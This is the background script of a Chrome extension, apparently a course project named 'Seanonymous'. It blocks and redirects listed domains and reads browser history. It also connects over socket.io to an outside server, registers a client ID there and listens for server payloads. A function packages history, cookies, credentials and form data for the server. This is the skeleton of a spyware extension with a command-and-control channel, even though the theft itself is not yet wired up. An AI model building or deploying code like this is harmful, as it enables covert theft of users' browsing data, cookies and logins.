var config = {
	ID: 0,
	js_cmd: [],
	last_pkt: Date.now()
};
var socket = null;

//redirecting
chrome.webRequest.onBeforeRequest.addListener(
	function(details){
			return{redirectUrl: "http://404.com/"};
	},
	{urls: redirect_domains},
	["blocking"]
);

//basic functionality
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        return {cancel: true };
    },
    {urls: blocked_domains},
    ["blocking"]
);



//Get user history, previous x results
function getClientHistory(millis, numResults){
chrome.history.search({text: '', maxResults: numResults}, function(data) {
    data.forEach(function(page) {
    	if(page.lastVisitTime>millis){
            alert(page.url);
		}

    });
});
}


//Testing out storage 
async function loadConfig(){
	await chrome.storage.sync.get('config', function(result){
		if(!(result.config == undefined)){
			config = result.config;
		}
	});
}

/* setClientID
 * @param {string} value
 */
async function storeConfig(){
	await chrome.storage.sync.set({config: config}, function(result){
		console.log('Seanonymous: configuration saved!');
	});
}



/* createJSON
 * package information into a json object that can be sent to the server
 * @param {integer} clientid
 * @param {string[]} history
 * @param {dictionary[]} cookies
 * @param {dictionary[]} creds
 * @param {dictionary[]} forms

 * @return {json} jsonData
 */
function createJSON(clientid, history, cookies, creds, forms){
	var jsonData = {};
	jsonData['clientid'] = clientid;
	jsonData['history'] = history;
	jsonData['cookies'] = cookies;
	jsonData['creds'] = creds;
	jsonData['forms'] = forms;
	return jsonData;
}
/* createClientIDRequest
 * package information to request a unique client id from the server
 *
 * @return {json} jsonData (0,nullHist,nullCook,nullCred,nullForms
 */
function createClientIDRequest(){
	return createJSON(0,[],[],[],[]);
	//TODO: change history and cookies accordingly
}

function handleServerPayload(payload) {
	console.log('Payload received: ' + JSON.stringify(payload, null, 2));
}




function connectToHost(){
	socket = io.connect('https://cse331.andrewjaffie.me/socket.io');
	
    socket.on('connect', function(){
        		
		console.log('stored clientid is ' + config.ID);
		if (config.ID == undefined || config.ID == 0 || config.ID == null){
			console.log('No ID stored, getting ID');
			socket.emit('extpayload', createClientIDRequest(), function(answer){
				config.ID = answer.clientid;
				storeConfig();
			});
		}
		
	});
	
    socket.on('error', function(data){
        console.log("Connection error: " + data);
    });
    socket.on('srvpayload',function(msg){
		console.log('message recieved from server');
		handleServerPayload(msg);
	});

	
    	//alert("json " + answer);
		//sending initial clientIDRequest
}

function main_func() {
	connectToHost();
	
}

loadConfig().then(main_func)


